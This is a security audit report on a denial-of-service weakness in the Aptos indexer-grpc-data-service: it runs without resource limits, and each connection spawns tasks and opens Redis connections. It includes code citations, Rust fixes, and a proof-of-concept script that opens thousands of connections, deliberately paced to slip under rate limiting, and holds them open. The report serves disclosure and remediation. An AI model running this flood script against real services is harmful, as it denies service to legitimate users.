# Audit Report

## Title
Indexer gRPC Data Service Lacks Resource Limits Leading to Resource Exhaustion DoS

## Summary
The indexer-grpc-data-service does not set OS-level resource limits (rlimit/ulimit) during startup, unlike the main aptos-node service. This allows unprivileged attackers to exhaust system resources (file descriptors, memory, CPU) by opening many concurrent connections, causing service denial.

## Finding Description

The indexer-grpc-data-service entry point fails to configure resource limits at startup, creating a resource exhaustion attack vector.

**Vulnerable Code Path:**

The service's main function simply parses arguments and starts the server without setting resource limits: [1](#0-0) 

The server framework's `run()` method also does not configure resource limits: [2](#0-1) 

**In Contrast, the Main Aptos Node Sets Resource Limits:**

The aptos-node properly calls `ensure_max_open_files_limit()` during startup: [3](#0-2) 

This function sets RLIMIT_NOFILE to prevent file descriptor exhaustion: [4](#0-3) 

**Resource Consumption Per Connection:**

Each client connection to the data service spawns an unbounded tokio task: [5](#0-4) 

Each spawned task opens a Redis connection: [6](#0-5) 

Each task can spawn up to 5 additional fetch tasks, multiplying resource consumption: [7](#0-6) 

**Attack Scenario:**

1. Attacker opens 1000+ concurrent connections to the indexer-grpc-data-service
2. Each connection spawns a task that opens Redis connections and file handles
3. Without rlimit protection, the process exhausts available file descriptors
4. New connection attempts fail with EMFILE (too many open files)
5. Existing connections may fail when attempting to open additional files
6. Service becomes unavailable to legitimate indexers

This breaks **Invariant 9: Resource Limits** - the service does not enforce OS-level resource constraints to prevent unbounded resource consumption.

## Impact Explanation

**Medium Severity** per Aptos Bug Bounty criteria:
- Service unavailability/crashes affecting the indexer infrastructure
- Does not directly affect consensus or validator operations
- Requires manual intervention to restore service
- Impacts data availability for indexers depending on this service

While the indexer-grpc-data-service is not consensus-critical (validators do not depend on it), it provides essential data feeds to ecosystem indexers and applications. A DoS attack renders this service unavailable, impacting the broader Aptos ecosystem's ability to process blockchain data.

## Likelihood Explanation

**High Likelihood:**
- No authentication required to establish connections
- Attacker only needs network access to the service endpoint
- Attack is trivial to execute (simple concurrent connection script)
- No rate limiting or connection limiting mechanisms exist
- Default system file descriptor limits (typically 1024-4096) are easily exhausted

The attack requires minimal resources from the attacker while causing significant service disruption.

## Recommendation

Implement resource limit enforcement in the indexer-grpc-data-service startup sequence, mirroring the approach used in aptos-node:

1. **Add resource limit configuration to IndexerGrpcDataServiceConfig:**
```rust
// In ecosystem/indexer-grpc/indexer-grpc-data-service/src/config.rs
pub struct IndexerGrpcDataServiceConfig {
    // ... existing fields ...
    
    /// Minimum file descriptor limit required
    #[serde(default = "IndexerGrpcDataServiceConfig::default_ensure_rlimit_nofile")]
    pub ensure_rlimit_nofile: u64,
    
    /// Whether to panic if rlimit cannot be set
    #[serde(default)]
    pub assert_rlimit_nofile: bool,
}

impl IndexerGrpcDataServiceConfig {
    pub const fn default_ensure_rlimit_nofile() -> u64 {
        10000 // Reasonable default for indexer service
    }
}
```

2. **Call resource limit enforcement in the run() method:**
```rust
// In ecosystem/indexer-grpc/indexer-grpc-data-service/src/config.rs
async fn run(&self) -> Result<()> {
    // Set resource limits early in startup
    #[cfg(unix)]
    aptos_node::utils::ensure_max_open_files_limit(
        self.ensure_rlimit_nofile,
        self.assert_rlimit_nofile,
    );
    
    // ... rest of existing run() implementation ...
}
```

3. **Additionally implement connection rate limiting:**
```rust
// Consider using tower::limit::ConcurrencyLimit
// or implementing custom middleware to limit concurrent connections
use tower::ServiceBuilder;

Server::builder()
    .layer(ServiceBuilder::new()
        .concurrency_limit(1000) // Limit concurrent connections
        .into_inner())
    // ... rest of server configuration ...
```

## Proof of Concept

```rust
// PoC: Resource exhaustion attack on indexer-grpc-data-service
// Save as: poc_resource_exhaustion.rs
// Run with: cargo run --bin poc_resource_exhaustion

use tokio::net::TcpStream;
use std::time::Duration;

#[tokio::main]
async fn main() {
    let target = "127.0.0.1:50051"; // Indexer gRPC service address
    let mut connections = vec![];
    
    println!("[*] Starting resource exhaustion attack on {}", target);
    
    // Open connections until we hit resource limits
    for i in 0..10000 {
        match TcpStream::connect(target).await {
            Ok(stream) => {
                connections.push(stream);
                if i % 100 == 0 {
                    println!("[+] Opened {} connections", i);
                }
            }
            Err(e) => {
                println!("[!] Connection failed at {} connections: {}", i, e);
                println!("[!] Service likely experiencing resource exhaustion");
                break;
            }
        }
        
        // Small delay to avoid network-level rate limiting
        tokio::time::sleep(Duration::from_millis(10)).await;
    }
    
    println!("[*] Holding {} connections open", connections.len());
    println!("[*] Service should now be unavailable to legitimate clients");
    
    // Hold connections open
    tokio::time::sleep(Duration::from_secs(300)).await;
}
```

**Expected Result:** The service will fail to accept new connections after exhausting available file descriptors (typically around 1024-4096 connections depending on system limits), demonstrating the vulnerability.

## Notes

This vulnerability affects all indexer-grpc services that use the same server framework pattern:
- `indexer-grpc-data-service`
- `indexer-grpc-data-service-v2`
- `indexer-grpc-gateway`
- `indexer-grpc-file-store`
- `indexer-grpc-manager`

All should be patched to set appropriate resource limits during startup to prevent resource exhaustion attacks.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/src/main.rs (L14-16)
```rust
async fn main() -> Result<()> {
    let args = ServerArgs::parse();
    args.run::<IndexerGrpcDataServiceConfig>().await
```

**File:** ecosystem/indexer-grpc/indexer-grpc-server-framework/src/lib.rs (L31-43)
```rust
    pub async fn run<C>(&self) -> Result<()>
    where
        C: RunnableConfig,
    {
        // Set up the server.
        setup_logging(None);
        setup_panic_handler();
        let config = load::<GenericConfig<C>>(&self.config_path)?;
        config
            .validate()
            .context("Config did not pass validation")?;
        run_server_with_config(config).await
    }
```

**File:** aptos-node/src/lib.rs (L245-249)
```rust
    // Ensure `ulimit -n`.
    ensure_max_open_files_limit(
        config.storage.ensure_rlimit_nofile,
        config.storage.assert_rlimit_nofile,
    );
```

**File:** aptos-node/src/utils.rs (L81-135)
```rust
pub fn ensure_max_open_files_limit(required: u64, assert_success: bool) {
    if required == 0 {
        return;
    }

    // Only works on Unix environments
    #[cfg(unix)]
    {
        if !rlimit::Resource::NOFILE.is_supported() {
            warn!(
                required = required,
                "rlimit setting not supported on this platform. Won't ensure."
            );
            return;
        }

        let (soft, mut hard) = match rlimit::Resource::NOFILE.get() {
            Ok((soft, hard)) => (soft, hard),
            Err(err) => {
                warn!(
                    error = ?err,
                    required = required,
                    "Failed getting RLIMIT_NOFILE. Won't ensure."
                );
                return;
            },
        };

        if soft >= required {
            return;
        }

        if required > hard {
            warn!(
                hard_limit = hard,
                required = required,
                "System RLIMIT_NOFILE hard limit too small."
            );
            // Not panicking right away -- user can be root
            hard = required;
        }

        rlimit::Resource::NOFILE
            .set(required, hard)
            .unwrap_or_else(|err| {
                let msg = format!("RLIMIT_NOFILE soft limit is {soft}, configured requirement is {required}, and \
                    failed to raise to it. Please make sure that `limit -n` shows a number larger than \
                    {required} before starting the node. Error: {err}.");
                if assert_success {
                    panic!("{}", msg)
                } else {
                    error!("{}", msg)
                }
            });
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/src/service.rs (L192-208)
```rust
        tokio::spawn({
            let request_metadata = request_metadata.clone();
            async move {
                data_fetcher_task(
                    redis_client,
                    file_store_operator,
                    cache_storage_format,
                    request_metadata,
                    transactions_count,
                    tx,
                    txns_to_strip_filter,
                    current_version,
                    in_memory_cache,
                )
                .await;
            }
        });
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/src/service.rs (L278-302)
```rust
    let mut tasks = tokio::task::JoinSet::new();
    let mut current_version = start_version;

    for _ in 0..num_tasks_to_use {
        tasks.spawn({
            // TODO: arc this instead of cloning
            let mut cache_operator = cache_operator.clone();
            let file_store_operator = file_store_operator.clone();
            let request_metadata = request_metadata.clone();
            async move {
                get_data_in_task(
                    current_version,
                    chain_id,
                    &mut cache_operator,
                    file_store_operator,
                    request_metadata.clone(),
                    cache_storage_format,
                )
                .await
            }
        });
        // Storage is in block of 1000: we align our current version fetch to the nearest block
        current_version += TRANSACTIONS_PER_STORAGE_BLOCK;
        current_version -= current_version % TRANSACTIONS_PER_STORAGE_BLOCK;
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/src/service.rs (L390-410)
```rust
    let conn = match redis_client.get_tokio_connection_manager().await {
        Ok(conn) => conn,
        Err(e) => {
            ERROR_COUNT
                .with_label_values(&["redis_connection_failed"])
                .inc();
            // Connection will be dropped anyway, so we ignore the error here.
            let _result = tx
                .send_timeout(
                    Err(Status::unavailable(
                        "[Data Service] Cannot connect to Redis; please retry.",
                    )),
                    RESPONSE_CHANNEL_SEND_TIMEOUT,
                )
                .await;
            error!(
                error = e.to_string(),
                "[Data Service] Failed to get redis connection."
            );
            return;
        },
```
